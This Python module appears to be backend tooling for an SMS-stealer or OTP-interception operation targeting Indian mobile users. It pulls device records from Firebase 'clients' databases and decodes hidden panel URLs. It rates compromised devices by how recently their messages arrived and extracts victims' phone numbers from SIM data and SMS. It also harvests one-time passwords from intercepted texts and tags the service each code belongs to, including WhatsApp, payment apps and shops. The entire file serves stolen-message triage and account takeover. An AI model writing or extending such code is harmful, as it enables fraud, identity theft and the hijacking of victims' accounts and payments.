import aiohttp, json, re, base64, time
from datetime import datetime, timedelta

async def fetch_fb(url, auth=None):
    full_url = url
    if auth and str(auth).strip() and str(auth) != "None":
        full_url += f"&auth={auth}" if "?" in full_url else f"?auth={auth}"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(full_url, timeout=4) as resp: 
                if resp.status == 200:
                    txt = await resp.text()
                    if txt == "null" or not txt: return {}
                    return json.loads(txt)
    except Exception: pass
    return None

async def check_ping(url, auth=None):
    start = time.time()
    full_url = url
    if auth and str(auth).strip() and str(auth) != "None":
        full_url += f"&auth={auth}" if "?" in full_url else f"?auth={auth}"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f"{full_url}/clients.json?shallow=true", timeout=3) as resp:
                if resp.status == 200: return f"{int((time.time() - start) * 1000)}ms"
    except Exception: pass
    return "❌ Timeout"

def decode_panel_url(panel_url):
    match = re.search(r'([A-Za-z0-9+/=]{20,})', panel_url)
    if not match: return None
    b64_str = match.group(1)
    try:
        b64_str += "=" * ((4 - len(b64_str) % 4) % 4)
        decoded = base64.b64decode(b64_str).decode('utf-8')
        if "|||" in decoded: return decoded.split("|||")[0], ""
        try:
            data = json.loads(decoded)
            if isinstance(data, dict) and "url" in data: return data["url"], data.get("key", "")
        except json.JSONDecodeError:
            if decoded.startswith("http"): return decoded, ""
    except Exception: pass
    return None

def calculate_health(msgs):
    if not msgs: return 1
    latest = 0
    now_ms = time.time() * 1000
    for m in msgs:
        ts = 0
        raw_id = m.get("id", 0)
        try:
            iv = int(raw_id)
            if iv > 10**12: ts = iv
        except: pass
        if not ts and m.get("dateTime"):
            try: ts = datetime.strptime(m["dateTime"], '%d-%m-%Y | %I:%M %p').timestamp() * 1000
            except: pass
        if ts > latest: latest = ts
        
    if not latest: return 1
    age_h = (now_ms - latest) / 3_600_000.0
    if age_h < 1: return 10
    if age_h < 6: return 9
    if age_h < 24: return 8
    if age_h < 48: return 7
    if age_h < 24 * 7: return 5
    if age_h < 24 * 14: return 3
    if age_h < 24 * 30: return 2
    return 1

_DIGITS = re.compile(r'\D')
def _clean_mobile(raw):
    if not raw or not isinstance(raw, str): return None
    s = raw.strip().lower()
    if s in ('unknown', 'none', 'null', 'na', 'n/a', ''): return None
    d = _DIGITS.sub('', s)
    if len(d) == 12 and d.startswith('91'): d = d[2:]
    elif len(d) == 11 and d.startswith('0'): d = d[1:]
    if len(d) != 10 or d[0] not in '6789': return None
    return d

_CARRIER_PATTERNS = [
    re.compile(r'(?:jio|airtel|vi\b|bsnl|idea|vodafone|reliance)[\s\-]+(?:mobile\s+|number\s+|no\.?\s*)?(\d{10})', re.I),
    re.compile(r'(?:jio|airtel|vi|bsnl|idea|vodafone|reliance)\s+नंबर\s*[:：]?\s*(\d{10})', re.I),
    re.compile(r'number\s*[:：]\s*(\d{10})', re.I),
]

_RE_DLT_ID = re.compile(r'^[A-Z]{1,3}-[A-Z0-9]{2,}-[A-Z]$')
_RE_SHORTCODE = re.compile(r'^\d{4,6}$')
_RE_ALNUM_ID = re.compile(r'^[A-Z]{2,}-[A-Z0-9]{3,}$')

def _is_service_sender(sender):
    if not sender: return True
    s = sender.strip()
    return bool(_RE_SHORTCODE.match(s) or _RE_DLT_ID.match(s) or _RE_ALNUM_ID.match(s))

def get_ws_chance(msgs):
    ws_msgs = []
    now = time.time()
    for m in msgs:
        if not isinstance(m, dict): continue
        text = (m.get("message") or "").lower()
        sender = str(m.get("sender") or "").lower()
        if "whatsapp" in text or "whatsapp" in sender or "wa" in sender:
            ts = 0
            try:
                iv = int(m.get("id", 0))
                if iv > 10**12: ts = iv / 1000
            except: pass
            if ts: ws_msgs.append(ts)
    
    if not ws_msgs: return 97
    latest_ws = max(ws_msgs)
    diff_hours = (now - latest_ws) / 3600
    
    if diff_hours > 24: return 97
    if diff_hours < 1: return 96
    return 70

def extract_best_numbers(dev_data, msgs):
    if not isinstance(dev_data, dict): dev_data = {}
    candidates = {}
    def bump(num, conf):
        if not num: return
        if candidates.get(num, -1) < conf: candidates[num] = conf

    bump(_clean_mobile(dev_data.get('mobNo')), 100)
    for sim in (dev_data.get('sims') or []):
        if isinstance(sim, dict): bump(_clean_mobile(sim.get('phoneNumber')), 100)

    if msgs:
        for m in msgs:
            if not isinstance(m, dict) or m.get('type') != 'incoming': continue
            body = m.get('message', '') or ''
            for pat in _CARRIER_PATTERNS:
                for hit in pat.findall(body): bump(_clean_mobile(hit), 100)

        freq = {}
        for m in msgs:
            if not isinstance(m, dict) or m.get('type') != 'incoming': continue
            if _is_service_sender(m.get('sender', '')): continue
            n = _clean_mobile(m.get('sender', ''))
            if n: freq[n] = freq.get(n, 0) + 1
        for n, c in freq.items(): bump(n, min(50 + c * 5, 95))

    return sorted(candidates.items(), key=lambda kv: (-kv[1], kv[0]))[:2]

_OTP_PATTERNS = [
    re.compile(r'\b(?:otp|o\.t\.p|verification\s*code|code)\s*(?:is|[:=-])?\s*(\d{4,8})\b', re.I),
    re.compile(r'\b(\d{4,8})\s*(?:is|:)\s*(?:your|the)\s*(?:otp|code|verification)', re.I),
    re.compile(r'\b(\d{4,8})\b[^\n]{0,40}?(?:otp|verification)', re.I),
]

def extract_otp(text):
    if not text: return None
    for pat in _OTP_PATTERNS:
        m = pat.search(text)
        if m: return m.group(1)
    return None

def extract_service_name(text, sender):
    text_lower = text.lower()
    services = {"whatsapp": "WhatsApp", "telegram": "Telegram", "facebook": "Facebook", "instagram": "Instagram", "amazon": "Amazon", "flipkart": "Flipkart", "swiggy": "Swiggy", "zomato": "Zomato", "paytm": "Paytm", "jio": "Jio", "airtel": "Airtel", "meesho": "Meesho", "tezcredit": "TezCredit", "creditt": "Creditt", "phonpe": "PhonePe", "tatacl": "TataCL", "canva": "Canva"}
    for key, name in services.items():
        if key in text_lower: return name
    if sender and "-" in sender: return sender.split("-")[1]
    return "Unknown"

def get_ist_time_str(ts):
    ist = datetime.utcfromtimestamp(ts) + timedelta(hours=5, minutes=30)
    return ist.strftime("%d %b %Y | %I:%M %p")
